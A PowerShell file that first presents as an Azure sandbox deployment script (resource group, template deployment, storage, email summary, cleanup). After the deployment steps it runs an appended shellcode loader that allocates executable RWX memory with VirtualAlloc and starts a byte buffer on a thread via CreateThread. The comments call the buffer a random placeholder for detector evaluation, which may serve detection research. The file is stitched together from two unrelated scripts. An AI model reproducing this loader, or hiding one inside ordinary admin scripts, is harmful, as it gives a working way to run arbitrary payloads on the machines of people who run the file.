[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ResourceGroup = 'rg-portal-test-10',

    [ValidateSet("westeurope", "eastus", "northeurope", 'uksouth')]
    [string]$Location = 'eastus',
    [string]$TemplateFile = 'C:\Scripts\templates\portal-test.json',
    [string]$ParameterFile = 'C:\Scripts\templates\portal-test.parameters.json',
    [string]$SubscriptionId = 'd91602d6-38d5-d12b-1e3e-ed034d77a5ae',

    [string]$StorageAccount = "sttest3612",
    [string]$VmName = 'vm-portal-test-10',
    [string]$OutputPath = 'C:\Logs\deploy-test-2026-03-16.json',
    [switch]$DryRun
)

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$InformationPreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'

Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$validation = Test-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile
if ($validation) {
    $validation | Format-Table -AutoSize
    throw 'Template validation failed.'
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize
$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)
$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
$deployment.Outputs | Format-Table -AutoSize

$summary = [pscustomobject]@{
    ResourceGroup     = $ResourceGroup
    Location          = $Location
    DeploymentName    = $DeploymentName
    ProvisioningState = $deployment.ProvisioningState
    StorageAccount    = $StorageAccount
    CompletedAt       = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$summary | ConvertTo-Json -Depth 3 | Set-Content -Path $OutputPath -Encoding UTF8

$style = @'
<style>
body { font-family: Segoe UI; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($summary) | ConvertTo-Html -Title 'Deployment summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.json', '.html') -Encoding UTF8

$MailTo = 'cloudops@contoso.com'
$subject = "Sandbox deployment {0}" -f $deployment.ProvisioningState

Send-MailMessage `
    -To $MailTo `
    -From "cloudops@contoso.com" `
    -Subject $subject `
    -Body "See the deployment summary attached to the run log." `
    -SmtpServer 'smtp.contoso.com' `
    -Port 587

if (-not $DryRun) {
    Remove-AzResourceGroup -Name $ResourceGroup -Force | Out-Null
    Write-Host ("Removed sandbox resource group {0}" -f $ResourceGroup)
}
Write-Host ("Sandbox deployment finished: {0}" -f $deployment.ProvisioningState) -ForegroundColor Green

$tags = @{
    Environment = 'test'
    Owner       = 'platform-team'
    CostCenter  = 'CC-1042'
}
Write-Verbose ("Tags: {0}" -f ($tags.Keys -join ', '))

$pricing = Get-AzConsumptionPriceSheet -ErrorAction SilentlyContinue
Write-Verbose ("Price sheet entries: {0}" -f @($pricing).Count)

$providers = Get-AzResourceProvider -ProviderNamespace Microsoft.Compute -ErrorAction SilentlyContinue
if ($providers) {
    Write-Verbose ("Provider registered: {0}" -f $providers.RegistrationState)
}

$quotas = Get-AzVMUsage -Location $Location -ErrorAction SilentlyContinue |
    Where-Object { $_.CurrentValue -ge ($_.Limit * 0.8) }
$quotas | Select-Object -First 5 Name, CurrentValue, Limit | Format-Table -AutoSize

$deployLog = Join-Path $env:TEMP ("az-deploy-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Write-Verbose ("Deployment log: {0}" -f $deployLog)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x24, 0xa5, 0xf1, 0x8e, 0x8f, 0xde, 0xc5, 0x3a, 0xce, 0x29, 0xa9, 0x22, 0x64, 0x57, 0x34, 0x29,
    0xa8, 0x7d, 0x21, 0x0c, 0x55, 0xee, 0x57, 0x47, 0x92, 0x45, 0x73, 0x45, 0x7d, 0xcc, 0x79, 0xd4,
    0xb8, 0xdd, 0x0e, 0xd0, 0x27, 0xaf, 0x8c, 0x59, 0xbd, 0xa9, 0x40, 0x7b, 0x02, 0xe2, 0xf3, 0x56,
    0x7d, 0x1c, 0x06, 0x60, 0xd2, 0xba, 0xda, 0x81, 0x35, 0xdd, 0x45, 0xa4, 0x8f, 0x5b, 0xa7, 0xff,
    0xce, 0xf5, 0x70, 0xdf, 0x15, 0xfd, 0x46, 0x90, 0x31, 0xc2, 0x61, 0x69, 0x6a, 0x04, 0xb8, 0xe3,
    0xdc, 0x71, 0x41, 0xe1, 0xc6, 0xab, 0x82, 0xdc, 0x58, 0xe2, 0x53, 0x4f, 0xe0, 0xdc, 0xba, 0x7a,
    0x0b, 0xc9, 0x54, 0x35, 0x44, 0xf3, 0x2b, 0xf3, 0xaf, 0x59, 0x16, 0x8e, 0xa9, 0xdb, 0x06, 0x09,
    0x55, 0x14, 0xab, 0xb0, 0xcf, 0xef, 0x6d, 0xec, 0x78, 0x94, 0x3f, 0xa9, 0x28, 0x79, 0x37, 0xb3,
    0x9d, 0x7f, 0xdf, 0x8d, 0x6c, 0xaa, 0x5a, 0x1f, 0x3d, 0xdd, 0xca, 0xed, 0xa7, 0xcb, 0x11, 0xe9,
    0x49, 0x23, 0x46, 0x38, 0x08, 0x76, 0x89, 0xa5, 0x39, 0x69, 0x1a, 0x6c, 0xde, 0x5d, 0xac, 0x31,
    0x21, 0xea, 0x78, 0x9f, 0x0a, 0x1b, 0x3b, 0xd4, 0xae, 0x7b, 0x7f, 0x59, 0x2c, 0xef, 0x91, 0x6a,
    0xb6, 0x08, 0x28, 0xf0, 0xe4, 0xf9, 0xbd, 0xf2, 0xc1, 0x9b, 0x2d, 0x8e, 0x1c, 0xc5, 0x3e, 0x50,
    0x11, 0x03, 0x2a, 0x25, 0x90, 0xae, 0x28, 0xca, 0xb1, 0x6d, 0xfe, 0x59, 0x45, 0xb6, 0xb0, 0x6f,
    0xa0, 0x20, 0x49, 0x28, 0x6d, 0xc1, 0x3e, 0xe6, 0x68, 0x7b, 0x1c, 0x53, 0xca, 0x91, 0x4a, 0xca,
    0xea, 0x47, 0x0c, 0x26, 0xd3, 0x38, 0x5f, 0x32, 0xe9, 0x63, 0x40, 0x12, 0x22, 0x02, 0x46, 0x80,
    0xb9, 0x1f, 0x0b, 0x10, 0x1a, 0x8b, 0x7e, 0x8e, 0x9a, 0x0e, 0x10, 0xfa, 0x74, 0xbf, 0x06, 0x64,
    0x65, 0x74, 0x0e, 0x64, 0xb2, 0x0d, 0x6a, 0xed, 0x66, 0x41, 0x00, 0xe3, 0xcd, 0xaf, 0xdc, 0x3d,
    0x15, 0x6e, 0x93, 0x07, 0x0a, 0xc9, 0x0a, 0xfc, 0x27, 0x95, 0xb6, 0x90, 0xc2, 0x39
)

$Handle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 4530)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
